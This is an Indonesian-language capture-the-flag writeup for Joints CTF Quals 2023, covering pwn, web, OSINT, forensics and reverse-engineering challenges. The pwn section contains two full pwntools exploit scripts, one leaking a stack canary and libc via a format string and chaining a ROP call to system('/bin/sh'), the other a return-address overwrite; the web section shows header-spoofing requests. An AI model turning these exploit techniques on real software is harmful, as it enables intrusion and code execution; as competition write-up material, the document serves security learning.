---

title: 'JointsCTF | Writeup'

---

Writeup Joints CTF Quals 2023
===

![](https://i.imgur.com/FGKhl6A.png)


TEAM:  anya lagi anya lagi, tapi yaudah deh semoga kali ini masuk tiga besar hehehe 

Member:
    - aimardcr
    - dimas

PWN
===
## Pass Manager

Dalam challenge ini, kita harus memanfaatkan kelemahan format string dan overflow buffer. Selain itu, kita harus dapat melakukan "leak" pada canary agar tidak terdeteksi adanya stack smashing. Berikut adalah payload yang saya gunakan untuk menyelesaikan tantangan ini: 

```python
from pwn import *
import sys

BINARY = "vuln(1)_patched"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 32
context.arch = "i386"

libc = ELF("libc.so.6")


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)
    def leak(self, fmt: str):
        p = self.p
        p.sendline(b"1")
        p.sendline(fmt.encode())
        p.recvuntil(b"Nice to meet you ")
        leaked = p.recvline().strip()
        p.sendline(b"foo")
        p.recvuntil(b"Password Manager")
        return leaked

x, p = init()
x.debug((
        "source /usr/share/gef/gef.py\n"
        "set disable-randomization off\n"
        # "break *add_password+303\n"
        "c\n"
))
# for i in range(100):
    # res = x.leak(f"%{i}$x")
    # print(i,res)
    # canary 23

canary = eval(b"0x"+x.leak("%23$x"))

leaked = eval(b"0x"+x.leak("%4$x"))
libc.address =  leaked-0x226da0
print(hex(libc.address))
pad = b"A".rjust(32, b"\x00")+p32(canary)+cyclic(12)

r = ROP(libc)
r.call(r.find_gadget(['ret']))
r.call('system', [libc.search(b'/bin/sh').__next__()])

p.sendline(b"1")
p.sendline(b"foo")
p.sendline(flat(pad,r))

p.interactive()
```

## Book Store

Pada challenge ini kita akan mengeksploitasi kerentanan buffer overflow, berikut payload yang saya gunakan untuk merubah return address agar ke addres fungsi yang didalamnya terdapat fungsi untuk membaca flagnya:

```python 
from pwn import *
import sys

BINARY = "vuln"
context.binary = exe = ELF(BINARY, checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 32


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)


x, p = init()
x.debug((
        "source /usr/share/gef/gef.py\n"
        # "break *searchBook+77\n"
        # "break *reqBook+108\n"
        "break *reqBook+246\n"
        "c\n"
))
pad = b"A".rjust(32, b"\x00")+cyclic(18)+p32(0x12a150e3)
r = ROP(exe)
r.find_gadget(['ret'])
r.call('secretBook')

p.sendline(b"4")
p.sendline(flat(pad, cyclic(4), r))
p.interactive()
```

WEB
===

## Vision

Pada source code HTML kita akan menemukan endpoint `/webChallSecret` seperti berikut

![](https://i.imgur.com/QnAIA3E.png)

Setelah masuk kita disable style hidden seperti berikut dan kita akan mendapatkan flagnya

![](https://i.imgur.com/DlkQsAK.png)

## Web of the Gods

Pada challenge ini kita akan menebak-nebak header dengan mengandalkan hint yang diberikan dari server. Berikut request akhir yang saya buat untuk mendapatkan flag dari server:

```http 
GET /Domain-of-Gods/secript.js HTTP/1.1
Host: 34.101.234.148:8069
Content-Length: 15
DNT: 1
Referer: https://www.jointsugm.id/
Accept-Language: el
Connection: close
```

Setelah itu nanti akan ada js seperti ini di dalam response yang kita dapat:

![](https://i.imgur.com/3P9es6U.png)

Setelah itu kita rubah eval menjadi console.log seperti berikut:

![](https://i.imgur.com/s71Xhau.png)

Setelah itu nanti kita akan menemukan flag di dalam console log tersebut

![](https://i.imgur.com/UMoABxt.png)

## LoG1n

Pada Challenge ini kita juga akan menebak-nebak header dan mendapatkan flag dari server.

Karna mungkin step-step yang perlu dilakukan sangat panjang, saya akan langsu memberikan payload terahir sebagai berikut:

```http 
GET /secret_thing_is_here/flag/real_flag_is_here HTTP/1.1
Host: 34.101.234.148:8499
From: admin@joints.com
DNT: 1
User-Agent: SuperSecretAdminBrowser
Cookie: 5fdedfe381eef204ab3354d244885a40=f827cf462f62848df37c5e1e94a4da74;adminEmail=admin@joints.com
Accept-Language: ur
Connection: close
```

![](https://i.imgur.com/3iDYP9N.png)

![](https://i.imgur.com/Nq6kqrG.png)

# OSINT
## whereIsThis

Pada challenge ini kita diberikan sebuah instruksi untuk mencari tempat dimana foto yang dilampirkan berada. Disini saya langsung mencoba melihat gambar yang diberikan secara seksama dan terdapat sesuatu yang menarik perhatian saya yaitu Pentol MbokDHE, disini saya langsung mencari beberapa tempat dimana pentol tersebut dijual, namun terdapat beberapa tempat. Setelah sedikit mencari, saya pun menemukan sebuah tempat yang memiliki foto yang sama pada januari 2022: 
![](https://i.imgur.com/el8q21t.png)

Lokasi: 69FC+8V Terban
FLAG: **JCTF2023{69FC+8V_TERBAN}**
# Forensic
## Spartan Ghosts
Kita diberikan sebuah file yang nampaknya terenkripsi, pada deskripsi sendiri kita diberikan clue bahwa file tersebut diencrypt menggunakan XOR, saat dicek menggunakan hex eidtor ternyata file diencrypt dengan key: `godofwar`. Akhirnya file pun terbuka dan kita diberikan beberapa file yaitu:
* cries_of_sparta.mp3
* history.txt
* saviour.jpeg

Disini tidak ada informasi menarik selain pada history.txt, yang dimana ketika kita liat huruf pertama dari setiap baris kalimat maka akan tersusun kalimat baru: 
```
Perched upon a hill so high,
Above a village peaceful and still,
Unleashed a force that made all cry,
Laying waste to homes and fields at will.

Screeches of pain, a deafening sound,
Tortured souls and broken dreams,
Ravaging through with no remorse found,
Eclipsing all that was serene.

The red sky was his sign of dread,
Conjuring death from his fiery shell,
Heralding destruction with every breath,
Every breath a fight, a battle to catch.

Death and destruction, a grave mismatch.
```
`PAUL STRECHED`, disini langsung saya cari diinternet dan ternyata paul streched ini merupakan sebuah audio tools untuk melakukan _strech_ pada sebuah audio. Disini saya menggunakan _Audacity_ untuk mencoba coba dan benar saja, terdengar ejaan flag ketika kita mengembalikan audio yang aslinya menggunakan effect `Change Tempo` menjadi +300:
![](https://i.imgur.com/VaibUqo.png)
FLAG: **JCTF2023{dream_on_kratos}** 
## Dinosaur
Kita diberikan sebuah gambar dinosaur, yang dimana ketika kita coba extract menggunakan steghide (karena ada clue pada deskripsi tentang Stegonosauru Hide), kami mendapatkan file `insides_of_stegosaurus.txt` yang berisi sebuah hex. Pada clue tertera Feedback Cipher yang maksudnya adalah CFB, lalu terdapat juga cluenya bahwa dinitialize dengan blowfish dan keynya dinosaur, langsung saya coba dan dapat flagnya:
![](https://i.imgur.com/GoMSVnz.png)
FLAG: **JCTF2023{the_st364n0s4uru5_likes_bl0wf15h}**
# Reverse Engineering
## For You
Kita diberikan sebuah bytecode python, pada intinya byte code ini akan menginisialisasikan sebuah list menjadi string, lalu code akan melakukan print satu per satu char tersebut dengan indices yang diacak, berikut solver yang kami gunakan:
```python
import sys

# Initialize the scrambled list
s = ['2', '_', 'e', 'n', 'u', 's', '3', '3', 'n', 'n', 'T', 'C', '_', '_', '2', '0', 'r', 't', 'g', '1', '0', '_', 'J', 'h', 's', 'w', '{', '4', 'e', 'u', '3', 'y', '}', '_', '3', 'F', 'o', 'd', '_', 'e', 'j', 'i', 't']

# Reverse the list and join it into a single string
s = ''.join(s[-1:None:-1])

# Define the indices list
indices = [20, 31, 32, 7, 28, 22, 28, 8, 16, 17, 8, 4, 2, 13, 18, 0, 4, 3, 33, 24, 1, 33, 8, 8, 26, 3, 5, 4, 0, 19, 23, 18, 4, 22, 33, 3, 4, 15, 4, 11, 6, 13, 10]

# Print the final result by iterating through the indices list
for index in indices:
    sys.stdout.write(s[index])
sys.stdout.flush()  # Ensure that the output is flushed to the console
```
FLAG: **JCTF2023{w3_just_engin33red_th1s_0ne_4_you}**